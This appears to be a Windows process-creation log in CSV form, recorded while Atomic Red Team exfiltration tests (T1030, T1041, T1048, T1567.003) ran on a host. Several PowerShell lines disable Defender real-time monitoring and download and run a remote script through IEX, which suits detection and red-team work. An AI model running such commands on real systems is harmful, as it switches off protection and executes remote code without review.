Image,CommandLine,ParentProcess
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,cmd.exe /C C:\WINDOWS\TEMP\pld4D67.tmp.bat T1030  --use-cleanup,C:\Windows\System32\rphcp.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\WINDOWS\SystemTemp\afzuro2k\afzuro2k.cmdline""",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\WINDOWS\SystemTemp\RES4B5F.tmp"" ""c:\Windows\SystemTemp\1mmn12st\CSCBC1060727F974B84ADB6AB43E750C19.TMP""",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\WINDOWS\SystemTemp\1mmn12st\1mmn12st.cmdline""",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Powershell.exe  Set-ExecutionPolicy Unrestricted ; Set-MpPreference -DisableRealtimeMonitoring $true ; Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force ; IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing); Install-AtomicRedTeam -Force -getAtomics ; Invoke-AtomicTest T1567.003 -CheckPrereqs ; Invoke-AtomicTest T1567.003 -GetPrereqs ; Invoke-AtomicTest T1567.003 ; Invoke-AtomicTest T1567.003 -Cleanup ; Set-MpPreference -DisableRealtimeMonitoring $false ,C:\Windows\System32\cmd.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\WINDOWS\SystemTemp\RES465E.tmp"" ""c:\Windows\SystemTemp\rnvrq5se\CSCC6E0CF2AF47B4A7A9C4B438FA419825.TMP""",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\WINDOWS\SystemTemp\rnvrq5se\rnvrq5se.cmdline""",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Powershell.exe  (Get-packageProvider -name nuget).ProviderPath ,C:\Windows\System32\cmd.exe
C:\Windows\System32\net1.exe,C:\WINDOWS\system32\net1  FILE ,C:\Windows\System32\net.exe
C:\Windows\System32\net.exe,NET  FILE ,C:\Windows\System32\cmd.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell.exe  Get-ExecutionPolicy ,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""10.0."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""10.0.22"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.2."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.1."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.0."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""5.1."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2022"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2019"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2016"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2012"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2008"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2003"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""PowerShellGet"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell  Get-Module -ListAvailable PowerShellGet ,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""cleanup"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO --use-cleanup """,C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,wmic  OS Get localdatetime /value,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,C:\WINDOWS\system32\cmd.exe /c wmic OS Get localdatetime /value,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""-9086"" 1>>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""-5547"" 1>>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""16506"" 1>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,cmd.exe /C C:\WINDOWS\TEMP\pld3FAA.tmp.bat T1567.003  --use-cleanup,C:\Windows\System32\rphcp.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Powershell.exe  Set-ExecutionPolicy Unrestricted ; Set-MpPreference -DisableRealtimeMonitoring $true ; Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force ; IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing); Install-AtomicRedTeam -Force -getAtomics ; Invoke-AtomicTest T1041 -CheckPrereqs ; Invoke-AtomicTest T1041 -GetPrereqs ; Invoke-AtomicTest T1041 ; Invoke-AtomicTest T1041 -Cleanup ; Set-MpPreference -DisableRealtimeMonitoring $false ,C:\Windows\System32\cmd.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\WINDOWS\SystemTemp\RES3391.tmp"" ""c:\Windows\SystemTemp\upotsaje\CSCA0E5D68F4AD24DDF888295F76DF09DEE.TMP""",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\WINDOWS\SystemTemp\upotsaje\upotsaje.cmdline""",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Powershell.exe  (Get-packageProvider -name nuget).ProviderPath ,C:\Windows\System32\cmd.exe
C:\Windows\System32\net1.exe,C:\WINDOWS\system32\net1  FILE ,C:\Windows\System32\net.exe
C:\Windows\System32\net.exe,NET  FILE ,C:\Windows\System32\cmd.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell.exe  Get-ExecutionPolicy ,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""10.0."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""10.0.22"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.2."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.1."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.0."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""5.1."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2022"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2019"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2016"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2012"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2008"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2003"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""PowerShellGet"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell  Get-Module -ListAvailable PowerShellGet ,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""cleanup"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO --use-cleanup """,C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,wmic  OS Get localdatetime /value,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,C:\WINDOWS\system32\cmd.exe /c wmic OS Get localdatetime /value,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""-3165"" 1>>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""-28089"" 1>>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""16493"" 1>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,cmd.exe /C C:\WINDOWS\TEMP\pld2C50.tmp.bat T1041  --use-cleanup,C:\Windows\System32\rphcp.exe
C:\Windows\System32\where.exe,where  /R C:\Users\ Bookmarks,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"""cmd.exe"" /c where /R C:\Users\ Bookmarks",-
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\WINDOWS\SystemTemp\RES28F3.tmp"" ""c:\Windows\SystemTemp\bh0kn3el\CSC7D707654F8C14C53A37E9573B2692BDD.TMP""",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\WINDOWS\SystemTemp\bh0kn3el\bh0kn3el.cmdline""",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Powershell.exe  Set-ExecutionPolicy Unrestricted ; Set-MpPreference -DisableRealtimeMonitoring $true ; Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force ; IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing); Install-AtomicRedTeam -Force -getAtomics ; Invoke-AtomicTest T1048.003 -CheckPrereqs ; Invoke-AtomicTest T1048.003 -GetPrereqs ; Invoke-AtomicTest T1048.003 ; Invoke-AtomicTest T1048.003 -Cleanup ; Set-MpPreference -DisableRealtimeMonitoring $false ,C:\Windows\System32\cmd.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\WINDOWS\SystemTemp\RES2307.tmp"" ""c:\Windows\SystemTemp\xgumknwl\CSC9396262CADE2494FA1B9D884FD53E74C.TMP""",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\WINDOWS\SystemTemp\xgumknwl\xgumknwl.cmdline""",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Powershell.exe  (Get-packageProvider -name nuget).ProviderPath ,C:\Windows\System32\cmd.exe
C:\Windows\System32\net1.exe,C:\WINDOWS\system32\net1  FILE ,C:\Windows\System32\net.exe
C:\Windows\System32\net.exe,NET  FILE ,C:\Windows\System32\cmd.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell.exe  Get-ExecutionPolicy ,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""10.0."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""10.0.22"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.2."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.1."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.0."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""5.1."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2022"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2019"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2016"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2012"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2008"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2003"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""PowerShellGet"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell  Get-Module -ListAvailable PowerShellGet ,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""cleanup"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO --use-cleanup """,C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,wmic  OS Get localdatetime /value,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,C:\WINDOWS\system32\cmd.exe /c wmic OS Get localdatetime /value,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""-12148"" 1>>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""-7115"" 1>>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""16476"" 1>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,cmd.exe /C C:\WINDOWS\TEMP\pld1B19.tmp.bat T1048.003  --use-cleanup,C:\Windows\System32\rphcp.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\WINDOWS\SystemTemp\RESD1E.tmp"" ""c:\Windows\SystemTemp\ooxf0tow\CSC2F71DB736FD5450AA235E7C1FEDC81C7.TMP""",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\WINDOWS\SystemTemp\ooxf0tow\ooxf0tow.cmdline""",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\System32\SecurityHealth\10.0.27703.1006-0\SecurityHealthHost.exe,\\?\C:\Windows\System32\SecurityHealth\10.0.27703.1006-0\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding,C:\Windows\System32\svchost.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Powershell.exe  Set-ExecutionPolicy Unrestricted ; Set-MpPreference -DisableRealtimeMonitoring $true ; Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force ; IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing); Install-AtomicRedTeam -Force -getAtomics ; Invoke-AtomicTest T1048 -CheckPrereqs ; Invoke-AtomicTest T1048 -GetPrereqs ; Invoke-AtomicTest T1048 ; Invoke-AtomicTest T1048 -Cleanup ; Set-MpPreference -DisableRealtimeMonitoring $false ,C:\Windows\System32\cmd.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\WINDOWS\SystemTemp\RES703.tmp"" ""c:\Windows\SystemTemp\ghf2srdf\CSC320BDDE26D4B119B9F1DEA82E8583.TMP""",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\WINDOWS\SystemTemp\ghf2srdf\ghf2srdf.cmdline""",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Powershell.exe  (Get-packageProvider -name nuget).ProviderPath ,C:\Windows\System32\cmd.exe
C:\Windows\System32\net1.exe,C:\WINDOWS\system32\net1  FILE ,C:\Windows\System32\net.exe
C:\Windows\System32\net.exe,NET  FILE ,C:\Windows\System32\cmd.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell.exe  Get-ExecutionPolicy ,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""10.0."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""10.0.22"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.2."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.1."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.0."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""5.1."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2022"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2019"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2016"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2012"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2008"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2003"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""PowerShellGet"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell  Get-Module -ListAvailable PowerShellGet ,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""cleanup"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO --use-cleanup """,C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,wmic  OS Get localdatetime /value,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,C:\WINDOWS\system32\cmd.exe /c wmic OS Get localdatetime /value,C:\Windows\System32\cmd.exe
